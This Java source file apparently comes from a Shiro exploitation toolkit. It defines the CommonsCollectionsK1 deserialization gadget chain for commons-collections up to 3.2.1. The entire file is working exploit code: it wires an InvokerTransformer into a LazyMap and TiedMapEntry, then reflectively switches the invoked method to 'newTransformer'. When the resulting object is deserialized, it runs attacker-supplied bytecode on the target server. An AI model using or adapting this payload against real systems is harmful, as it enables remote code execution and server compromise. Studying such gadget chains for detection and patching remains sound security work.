package com.sma11new.exp.shiro.attack.payloads;

import cn.hutool.core.util.RandomUtil;
import com.sma11new.exp.shiro.attack.payloads.annotation.Authors;
import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.Reflections;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

@Dependencies(value={"commons-collections:commons-collections:<=3.2.1"})
@Authors(value={"KORLR"})
public class CommonsCollectionsK1
implements ObjectPayload<Map> {
    @Override
    public Map getObject(Object tpl) throws Exception {
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        HashMap innerMap = new HashMap();
        Map m = LazyMap.decorate(innerMap, transformer);
        HashMap<TiedMapEntry, String> outerMap = new HashMap<TiedMapEntry, String>();
        TiedMapEntry tied = new TiedMapEntry(m, tpl);
        String baseString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        String pass = RandomUtil.randomString(baseString, 2);
        outerMap.put(tied, pass);
        innerMap.clear();
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return outerMap;
    }
}

